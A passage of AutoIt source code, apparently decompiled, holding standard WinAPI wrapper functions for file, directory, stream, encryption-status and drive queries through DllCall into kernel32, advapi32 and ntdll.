        Local $acall = DllCall("kernel32.dll", "bool", "BackupWrite", "handle", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "bool", 0x1, "bool", 0x0, "ptr*", $pcontext)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, False)
        $pcontext = $acall[0x7]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BackupWriteAbort

    Func _WinAPI_CopyFileEx($sexistingfile, $snewfile, $iflags = 0x0, $pprogressproc = 0x0, $pdata = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "CopyFileExW", "wstr", $sexistingfile, "wstr", $snewfile, "ptr", $pprogressproc, "struct*", $pdata, "bool*", 0x0, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CopyFileEx

    Func _WinAPI_CreateDirectory($sdir, $tsecurity = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "CreateDirectoryW", "wstr", $sdir, "struct*", $tsecurity)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateDirectory

    Func _WinAPI_CreateDirectoryEx($snewdir, $stemplatedir, $tsecurity = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "CreateDirectoryExW", "wstr", $stemplatedir, "wstr", $snewdir, "struct*", $tsecurity)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateDirectoryEx

    Func _WinAPI_CreateFileEx($sfilepath, $icreation, $iaccess = 0x0, $ishare = 0x0, $iflagsandattributes = 0x0, $tsecurity = 0x0, $htemplate = 0x0)
        Local $acall = DllCall("kernel32.dll", "handle", "CreateFileW", "wstr", $sfilepath, "dword", $iaccess, "dword", $ishare, "struct*", $tsecurity, "dword", $icreation, "dword", $iflagsandattributes, "handle", $htemplate)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] = Ptr(+ -1) Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateFileEx

    Func _WinAPI_CreateFileMapping($hfile, $isize = 0x0, $sname = '', $iprotect = 0x4, $tsecurity = 0x0)
        If Not StringStripWS($sname, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sname = Null
        Local $acall = DllCall("kernel32.dll", "handle", "CreateFileMappingW", "handle", $hfile, "struct*", $tsecurity, "dword", $iprotect, "dword", _WinAPI_HiDWord($isize), "dword", _WinAPI_LoDWord($isize), "wstr", $sname)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return SetExtended(_WinAPI_GetLastError(), $acall[0x0])
    EndFunc    ; -> _WinAPI_CreateFileMapping

    Func _WinAPI_CreateHardLink($snewfile, $sexistingfile)
        Local $acall = DllCall("kernel32.dll", "bool", "CreateHardLinkW", "wstr", $snewfile, "wstr", $sexistingfile, "ptr", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateHardLink

    Func _WinAPI_CreateObjectID($sfilepath)
        Local $hfile = _WinAPI_CreateFileEx($sfilepath, $OPEN_EXISTING, 0x0, $FILE_SHARE_READWRITE, $FILE_FLAG_BACKUP_SEMANTICS)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tfoid = DllStructCreate("byte[16];byte[48]")
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x900c0, "ptr", 0x0, "dword", 0x0, "struct*", $tfoid, "dword", DllStructGetSize($tfoid), "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
        Local $tguid = DllStructCreate($TAGGUID)
        _WinAPI_MoveMemory($tguid, $tfoid, 0x10)
        Return $tguid
    EndFunc    ; -> _WinAPI_CreateObjectID

    Func _WinAPI_CreateSymbolicLink($ssymlink, $starget, $bdirectory = False)
        If $bdirectory Then
            $bdirectory = 0x1
        EndIf
        Local $acall = DllCall("kernel32.dll", "boolean", "CreateSymbolicLinkW", "wstr", $ssymlink, "wstr", $starget, "dword", $bdirectory)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateSymbolicLink

    Func _WinAPI_DecryptFile($sfilepath)
        Local $acall = DllCall("advapi32.dll", "bool", "DecryptFileW", "wstr", $sfilepath, "dword", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DecryptFile

    Func _WinAPI_DefineDosDevice($sdevice, $iflags, $sfilepath = '')
        If Not StringStripWS($sfilepath, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sfilepath = Null
        Local $acall = DllCall("kernel32.dll", "bool", "DefineDosDeviceW", "dword", $iflags, "wstr", $sdevice, "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DefineDosDevice

    Func _WinAPI_DeleteFile($sfilepath)
        Local $acall = DllCall("kernel32.dll", "bool", "DeleteFileW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DeleteFile

    Func _WinAPI_DeleteObjectID($sfilepath)
        Local $hfile = _WinAPI_CreateFileEx($sfilepath, $OPEN_EXISTING, $GENERIC_WRITE, $FILE_SHARE_READWRITE, $FILE_FLAG_BACKUP_SEMANTICS)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x900a0, "ptr", 0x0, "dword", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DeleteObjectID

    Func _WinAPI_DeleteVolumeMountPoint($smountedpath)
        Local $acall = DllCall("kernel32.dll", "bool", "DeleteVolumeMountPointW", "wstr", $smountedpath)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DeleteVolumeMountPoint

    Func _WinAPI_DeviceIoControl($hdevice, $icontrolcode, $pinbuffer = 0x0, $iinbuffersize = 0x0, $poutbuffer = 0x0, $ioutbuffersize = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hdevice, "dword", $icontrolcode, "struct*", $pinbuffer, "dword", $iinbuffersize, "struct*", $poutbuffer, "dword", $ioutbuffersize, "dword*", 0x0, "ptr", 0x0)
        If @error Then Return SetError(@error, @extended, False)
        Return SetExtended($acall[0x7], $acall[0x0])
    EndFunc    ; -> _WinAPI_DeviceIoControl

    Func _WinAPI_DuplicateEncryptionInfoFile($ssrcfilepath, $sdestfilepath, $icreation = 0x2, $iattributes = 0x0, $tsecurity = 0x0)
        Local $acall = DllCall("advapi32.dll", "dword", "DuplicateEncryptionInfoFile", "wstr", $ssrcfilepath, "wstr", $sdestfilepath, "dword", $icreation, "dword", $iattributes, "struct*", $tsecurity)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DuplicateEncryptionInfoFile

    Func _WinAPI_EjectMedia($sdrive)
        Local $hfile = _WinAPI_CreateFileEx("\\\\.\\" & $sdrive, $OPEN_EXISTING, $GENERIC_READ, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d4808, "ptr", 0x0, "dword", 0x0, "ptr", 0x0, "dword", 0x0, "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_EjectMedia

    Func _WinAPI_EncryptFile($sfilepath)
        Local $acall = DllCall("advapi32.dll", "bool", "EncryptFileW", "wstr", $sfilepath)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_EncryptFile

    Func _WinAPI_EncryptionDisable($sdir, $bdisable)
        Local $acall = DllCall("advapi32.dll", "bool", "EncryptionDisable", "wstr", $sdir, "bool", $bdisable)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_EncryptionDisable

    Func _WinAPI_EnumFiles($sdir, $iflag = 0x0, $STEMPLATE = '', $BEXCLUDE = False)
        Local $acall, $ierror = 0x0
        Local $ADATA[0x1f5][0x7] = [[0x0]]
        Local $hdir = _WinAPI_CreateFileEx($sdir, $OPEN_EXISTING, 0x1, $FILE_SHARE_ANY, $FILE_FLAG_BACKUP_SEMANTICS)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $pbuffer = __HeapAlloc($__g_iheapsize)
        If @error Then
            $ierror = @error
        Else
            Local $tiosb = DllStructCreate("ptr;ulong_ptr")
            $acall = DllCall("ntdll.dll", "uint", "ZwQueryDirectoryFile", "handle", $hdir, "ptr", 0x0, "ptr", 0x0, "ptr", 0x0, "struct*", $tiosb, "struct*", $pbuffer, "ulong", 0x800000, "uint", 0x1, "boolean", 0x0, "ptr", 0x0, "boolean", 0x1)
            If @error Or $acall[0x0] Then
                $ierror = @error + 0x28
            EndIf
        EndIf
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hdir)
        If $ierror Then
            __HeapFree($pbuffer, 0x1)
            If IsArray($acall) Then
                Return SetError(0xa, $acall[0x0], 0x0)
            Else
                Return SetError($ierror, 0x0, 0x0)
            EndIf
        EndIf
        Local $tfdi, $iattrib, $starget, $ilength = 0x0, $ioffset = 0x0
        Do
            $ilength += $ioffset
            $tfdi = DllStructCreate("ulong;ulong;int64;int64;int64;int64;int64;int64;ulong;ulong;wchar[" & (DllStructGetData(DllStructCreate("ulong", $pbuffer + $ilength + 0x3c), 0x1) / 0x2) & "]", $pbuffer + $ilength)
            $starget = DllStructGetData($tfdi, 0xb)
            $iattrib = DllStructGetData($tfdi, 0x9)
            $ioffset = DllStructGetData($tfdi, 0x1)
            Switch $starget
            Case ".", ".."
                ContinueLoop
            Case Else
                Switch $iflag
                Case 0x1, 0x2
                    If BitAND($iattrib, 0x10) Then
                        If $iflag = 0x1 Then
                            ContinueLoop
                        EndIf
                    Else
                        If $iflag = 0x2 Then
                            ContinueLoop
                        EndIf
                    EndIf
                EndSwitch
                If $STEMPLATE Then
                    $acall = DllCall("shlwapi.dll", "int", "PathMatchSpecW", "wstr", $starget, "wstr", $STEMPLATE)
                    If @error Or ($acall[0x0] And $BEXCLUDE) Or (Not $acall[0x0] And Not $BEXCLUDE) Then
                        ContinueLoop
                    EndIf
                EndIf
            EndSwitch
            __Inc($ADATA, 0x1f4)
            $ADATA[$ADATA[0x0][0x0]][0x0] = $starget
            $ADATA[$ADATA[0x0][0x0]][0x1] = DllStructGetData($tfdi, 0x3)
            $ADATA[$ADATA[0x0][0x0]][0x2] = DllStructGetData($tfdi, 0x4)
            $ADATA[$ADATA[0x0][0x0]][0x3] = DllStructGetData($tfdi, 0x5)
            $ADATA[$ADATA[0x0][0x0]][0x4] = DllStructGetData($tfdi, 0x7)
            $ADATA[$ADATA[0x0][0x0]][0x5] = DllStructGetData($tfdi, 0x8)
            $ADATA[$ADATA[0x0][0x0]][0x6] = $iattrib
        Until Not $ioffset
        __HeapFree($pbuffer)
        __Inc($ADATA, + -1)
        Return $ADATA
    EndFunc    ; -> _WinAPI_EnumFiles

    Func _WinAPI_EnumFileStreams($sfilepath)
        Local $tdata = DllStructCreate("byte[32768]")
        Local $pdata = DllStructGetPtr($tdata)
        Local $ADATA[0x65][0x2] = [[0x0]]
        Local $hfile = _WinAPI_CreateFileEx($sfilepath, $OPEN_EXISTING, 0x0, $FILE_SHARE_READWRITE, $FILE_FLAG_BACKUP_SEMANTICS)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $ierror = 0x0
        Local $tiosb = DllStructCreate("ptr;ulong_ptr")
        Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "ptr", $pdata, "ulong", 0x8000, "uint", 0x16)
        If @error Then $ierror = @error
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Local $tfsi, $ilength = 0x0, $ioffset = 0x0
        Do
            $ilength += $ioffset
            $tfsi = DllStructCreate("ulong;ulong;int64;int64;wchar[" & (DllStructGetData(DllStructCreate("ulong", $pdata + $ilength + 0x4), 0x1) / 0x2) & "]", $pdata + $ilength)
            __Inc($ADATA)
            $ADATA[$ADATA[0x0][0x0]][0x0] = DllStructGetData($tfsi, 0x5)
            $ADATA[$ADATA[0x0][0x0]][0x1] = DllStructGetData($tfsi, 0x3)
            $ioffset = DllStructGetData($tfsi, 0x1)
        Until Not $ioffset
        __Inc($ADATA, + -1)
        Return $ADATA
    EndFunc    ; -> _WinAPI_EnumFileStreams

    Func _WinAPI_EnumHardLinks($sfilepath)
        Local $tdata = DllStructCreate("byte[32768]")
        Local $pdata = DllStructGetPtr($tdata)
        Local $hfile = _WinAPI_CreateFileEx($sfilepath, $OPEN_EXISTING, 0x0, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $ierror = 0x0
        Local $tiosb = DllStructCreate("ptr;ulong_ptr")
        Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "ptr", $pdata, "ulong", 0x8000, "uint", 0x2e)
        If @error Or $acall[0x0] Then
            $ierror = @error + 0xa
            DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
            If $acall Then Return SetError($ierror, 0x0, 0x0)
            If $acall[0x0] Then Return SetError(0xa, $ierror, 0x0)
        EndIf
        Local $icount = DllStructGetData(DllStructCreate("ulong;ulong", $pdata), 0x2)
        Local $ADATA[$icount + 0x1] = [$icount]
        Local $tflei, $hpath, $spath, $ilength = 0x8
        For $i = 0x1 To $icount
            $tflei = DllStructCreate("ulong;int64;ulong;wchar[" & (DllStructGetData(DllStructCreate("ulong", $pdata + $ilength + 0x10), 0x1)) & "]", $pdata + $ilength)
            $ierror = 0x0
            Do
                $hpath = _WinAPI_OpenFileById($hfile, DllStructGetData($tflei, 0x2), 0x100080, $FILE_SHARE_READWRITE, $FILE_FLAG_BACKUP_SEMANTICS)
                If @error Then
                    $ierror = @error + 0x64
                    ExitLoop
                EndIf
                $spath = _WinAPI_GetFinalPathNameByHandleEx($hpath)
                If @error Then
                    $ierror = @error + 0xc8
                    ExitLoop
                EndIf
            Until 0x1
            If $hpath Then
                DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hpath)
            EndIf
            If $ierror Then ExitLoop
            $ADATA[$i] = _WinAPI_PathAppend($spath, DllStructGetData($tflei, 0x4))
            $ilength += DllStructGetData($tflei, 0x1)
        Next
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $ADATA
    EndFunc    ; -> _WinAPI_EnumHardLinks

    Func _WinAPI_FileEncryptionStatus($sfilepath)
        Local $acall = DllCall("advapi32.dll", "bool", "FileEncryptionStatusW", "wstr", $sfilepath, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, + -1)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_FileEncryptionStatus

    Func _WinAPI_FileExists($sfilepath)
        If Not FileExists($sfilepath) Then Return 0x0
        If _WinAPI_PathIsDirectory($sfilepath) Then Return SetExtended(0x1, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_FileExists

    Func _WinAPI_FileInUse($sfilepath)
        Local $hfile = _WinAPI_CreateFileEx($sfilepath, $OPEN_EXISTING, $GENERIC_READ)
        If @error Then
            If @extended = 0x20 Then Return 0x1
            Return SetError(@error, @extended, 0x0)
        EndIf
        DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hfile)
        Return 0x0
    EndFunc    ; -> _WinAPI_FileInUse

    Func _WinAPI_FindClose($hsearch)
        Local $acall = DllCall("kernel32.dll", "bool", "FindClose", "handle", $hsearch)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindClose

    Func _WinAPI_FindCloseChangeNotification($hchange)
        Local $acall = DllCall("kernel32.dll", "bool", "FindCloseChangeNotification", "handle", $hchange)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindCloseChangeNotification

    Func _WinAPI_FindFirstChangeNotification($sdirectory, $iflags, $bsubtree = False)
        Local $acall = DllCall("kernel32.dll", "handle", "FindFirstChangeNotificationW", "wstr", $sdirectory, "bool", $bsubtree, "dword", $iflags)
        If @error Or ($acall[0x0] = Ptr(+ -1)) Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindFirstChangeNotification

    Func _WinAPI_FindFirstFile($sfilepath, $tdata)
        Local $acall = DllCall("kernel32.dll", "handle", "FindFirstFileW", "wstr", $sfilepath, "struct*", $tdata)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] = Ptr(+ -1) Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindFirstFile

    Func _WinAPI_FindFirstFileName($sfilepath, ByRef $slink)
        $slink = ''
        Local $acall = DllCall("kernel32.dll", "handle", "FindFirstFileNameW", "wstr", $sfilepath, "dword", 0x0, "dword*", 0x1000, "wstr", '')
        If @error Or ($acall[0x0] = Ptr(+ -1)) Then Return SetError(@error + 0xa, @extended, 0x0)
        $slink = $acall[0x4]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindFirstFileName

    Func _WinAPI_FindFirstStream($sfilepath, $tdata)
        Local $acall = DllCall("kernel32.dll", "handle", "FindFirstStreamW", "wstr", $sfilepath, "uint", 0x0, "struct*", $tdata, "dword", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] = Ptr(+ -1) Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindFirstStream

    Func _WinAPI_FindNextChangeNotification($hchange)
        Local $acall = DllCall("kernel32.dll", "bool", "FindNextChangeNotification", "handle", $hchange)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindNextChangeNotification

    Func _WinAPI_FindNextFile($hsearch, $tdata)
        Local $acall = DllCall("kernel32.dll", "bool", "FindNextFileW", "handle", $hsearch, "struct*", $tdata)
        If @error Then Return SetError(@error, @extended, False)
        If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindNextFile

    Func _WinAPI_FindNextFileName($hsearch, ByRef $slink)
        $slink = ''
        Local $acall = DllCall("kernel32.dll", "bool", "FindNextFileNameW", "handle", $hsearch, "dword*", 0x1000, "wstr", '')
        If @error Then Return SetError(@error, @extended, False)
        If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
        $slink = $acall[0x3]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindNextFileName

    Func _WinAPI_FindNextStream($hsearch, $tdata)
        Local $acall = DllCall("kernel32.dll", "bool", "FindNextStreamW", "handle", $hsearch, "struct*", $tdata)
        If @error Then Return SetError(@error, @extended, False)
        If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindNextStream

    Func _WinAPI_FlushFileBuffers($hfile)
        Local $acall = DllCall("kernel32.dll", "bool", "FlushFileBuffers", "handle", $hfile)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FlushFileBuffers

    Func _WinAPI_FlushViewOfFile($paddress, $ibytes = 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "FlushViewOfFile", "struct*", $paddress, "dword", $ibytes)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FlushViewOfFile

    Func _WinAPI_GetBinaryType($sfilepath)
        Local $acall = DllCall("kernel32.dll", "int", "GetBinaryTypeW", "wstr", $sfilepath, "dword*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If Not $acall[0x0] Then $acall[0x2] = 0x0
        Return SetExtended($acall[0x2], $acall[0x0])
    EndFunc    ; -> _WinAPI_GetBinaryType

    Func _WinAPI_GetCDType($sdrive)
        Local $hfile = _WinAPI_CreateFileEx("\\\\.\\" & $sdrive, $OPEN_EXISTING, $GENERIC_READWRITE, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tagscsi_pass_through = "struct;ushort Length;byte ScsiStatus;byte PathId;byte TargetId;byte Lun;byte CdbLength;byte SenseInfoLength;byte DataIn;ulong DataTransferLength;ulong TimeOutVa" & _
            "lue;ulong_ptr DataBufferOffset;ulong SenseInfoOffset;byte Cdb[16];endstruct"
        Local $tspt = DllStructCreate($tagscsi_pass_through & ";byte Hdr[8]")
        Local $tcdb = DllStructCreate("byte;byte;byte[2];byte[3];byte[2];byte;byte[2];byte[4]", DllStructGetPtr($tspt, "Cdb"))
        Local $thdr = DllStructCreate("byte[4];byte;byte;byte[2]", DllStructGetPtr($tspt, "Hdr"))
        Local $isize = DllStructGetPtr($tspt, "Hdr") - DllStructGetPtr($tspt)
        DllStructSetData($tspt, "Length", $isize)
        DllStructSetData($tspt, "ScsiStatus", 0x0)
        DllStructSetData($tspt, "PathId", 0x0)
        DllStructSetData($tspt, "TargetId", 0x0)
        DllStructSetData($tspt, "Lun", 0x0)
        DllStructSetData($tspt, "CdbLength", 0xc)
        DllStructSetData($tspt, "SenseInfoLength", 0x0)
        DllStructSetData($tspt, "DataIn", 0x1)
        DllStructSetData($tspt, "DataTransferLength", 0x8)
        DllStructSetData($tspt, "TimeOutValue", 0x15180)
        DllStructSetData($tspt, "DataBufferOffset", $isize)
        DllStructSetData($tspt, "SenseInfoOffset", 0x0)
        DllStructSetData($tcdb, 0x1, 0x46)
        DllStructSetData($tcdb, 0x2, 0x0)
        DllStructSetData($tcdb, 0x3, 0x0, 0x1)
        DllStructSetData($tcdb, 0x3, 0x0, 0x2)
        DllStructSetData($tcdb, 0x5, 0x0, 0x1)
        DllStructSetData($tcdb, 0x5, 0x8, 0x2)
        DllStructSetData($tcdb, 0x6, 0x0)
        DllStructSetData($tcdb, 0x7, 0x0, 0x1)
        DllStructSetData($tcdb, 0x7, 0x0, 0x2)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x4d004, "struct*", $tspt, "dword", $isize, "struct*", $tspt, "dword", DllStructGetSize($tspt), "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
        Return BitOR(BitShift(DllStructGetData($thdr, 0x4, 0x1), + -8), DllStructGetData($thdr, 0x4, 0x2))
    EndFunc    ; -> _WinAPI_GetCDType

    Func _WinAPI_GetCompressedFileSize($sfilepath)
        Local $acall = DllCall("kernel32.dll", "dword", "GetCompressedFileSizeW", "wstr", $sfilepath, "dword*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] = + -1 Then
            Local $ilasterror = _WinAPI_GetLastError()
            If $acall[0x2] = 0x0 Then Return SetError(0xa, $ilasterror, 0x0)
            If $ilasterror Then Return SetError(0xb, $ilasterror, 0x0)
        EndIf
        Return __WinAPI_MakeQWord($acall[0x0], $acall[0x2])
    EndFunc    ; -> _WinAPI_GetCompressedFileSize

    Func _WinAPI_GetCompression($sfilepath)
        Local $hfile = _WinAPI_CreateFileEx($sfilepath, $OPEN_EXISTING, $GENERIC_READ, $FILE_SHARE_READWRITE, $FILE_FLAG_BACKUP_SEMANTICS)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x9003c, "ptr", 0x0, "dword", 0x0, "ushort*", 0x0, "dword", 0x2, "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, + -1)
        Return $acall[0x5]
    EndFunc    ; -> _WinAPI_GetCompression

    Func _WinAPI_GetCurrentDirectory()
        Local $acall = DllCall("kernel32.dll", "dword", "GetCurrentDirectoryW", "dword", 0x1000, "wstr", '')
        If @error Then Return SetError(@error, @extended, '')
        Return SetExtended($acall[0x0], $acall[0x2])
    EndFunc    ; -> _WinAPI_GetCurrentDirectory

    Func _WinAPI_GetDiskFreeSpaceEx($sdrive)
        Local $acall = DllCall("kernel32.dll", "bool", "GetDiskFreeSpaceEx", "str", $sdrive, "int64*", 0x0, "int64*", 0x0, "int64*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x3]
        For $i = 0x0 To 0x2
            $aret[$i] = $acall[$i + 0x2]
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetDiskFreeSpaceEx

    Func _WinAPI_GetDriveBusType($sdrive)
        Local $hfile = _WinAPI_CreateFileEx("\\\\.\\" & $sdrive, $OPEN_EXISTING, 0x0, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, + -1)
        Local $tagstorage_property_query = "ulong PropertyId;ulong QueryType;byte AdditionalParameters[1]"
        Local $tspq = DllStructCreate($tagstorage_property_query)
        Local $tsdd = DllStructCreate("ulong Version;ulong Size;byte DeviceType;byte DeviceTypeModifier;byte RemovableMedia;byte CommandQueueing;ulong VendorIdOffset;ulong ProductIdOffset;ulong Produ" & _
            "ctRevisionOffset;ulong SerialNumberOffset;ulong BusType;ulong RawPropertiesLength;byte RawDeviceProperties[1]")
        DllStructSetData($tspq, "PropertyId", 0x0)
        DllStructSetData($tspq, "QueryType", 0x0)
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d1400, "struct*", $tspq, "dword", DllStructGetSize($tspq), "struct*", $tsdd, "dword", DllStructGetSize($tsdd), "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, + -1)
        Return DllStructGetData($tsdd, "BusType")
    EndFunc    ; -> _WinAPI_GetDriveBusType

    Func _WinAPI_GetDriveGeometryEx($idrive)
        Local $hfile = _WinAPI_CreateFileEx("\\\\.\\PhysicalDrive" & $idrive, $OPEN_EXISTING, 0x0, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tdgex = DllStructCreate("uint64;dword;dword;dword;dword;uint64")
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x700a0, "ptr", 0x0, "dword", 0x0, "struct*", $tdgex, "dword", DllStructGetSize($tdgex), "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
        Local $aret[0x6]
        For $i = 0x0 To 0x5
            $aret[$i] = DllStructGetData($tdgex, $i + 0x1)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetDriveGeometryEx

    Func _WinAPI_GetDriveNumber($sdrive)
        Local $hfile = _WinAPI_CreateFileEx("\\\\.\\" & $sdrive, $OPEN_EXISTING, 0x0, $FILE_SHARE_READWRITE)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        Local $tsdn = DllStructCreate("dword;dword;dword")
        Local $acall = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $hfile, "dword", 0x2d1080, "ptr", 0x0, "dword", 0x0, "struct*", $tsdn, "dword", DllStructGetSize($tsdn), "dword*", 0x0, "ptr", 0x0)
        If __CheckErrorCloseHandle($acall, $hfile) Then Return SetError(@error, @extended, 0x0)
        Local $aret[0x3]
        For $i = 0x0 To 0x2
            $aret[$i] = DllStructGetData($tsdn, $i + 0x1)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetDriveNumber

    Func _WinAPI_GetDriveType($sdrive = '')
        If Not StringStripWS($sdrive, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sdrive = Null
        Local $acall = DllCall("kernel32.dll", "uint", "GetDriveType", "str", $sdrive)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetDriveType

    Func _WinAPI_GetFileAttributes($sfilepath)
        Local $acall = DllCall("kernel32.dll", "dword", "GetFileAttributesW", "wstr", $sfilepath)
        If @error Or ($acall[0x0] = -1) Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetFileAttributes

    Func _WinAPI_GetFileID($hfile)
        Local $tiosb = DllStructCreate("ptr;ulong_ptr")
        Local $acall = DllCall("ntdll.dll", "long", "ZwQueryInformationFile", "handle", $hfile, "struct*", $tiosb, "int64*", 0x0, "ulong", 0x8, "uint", 0x6)
        If @error Then Return SetError(@error, @extended, 0x0)
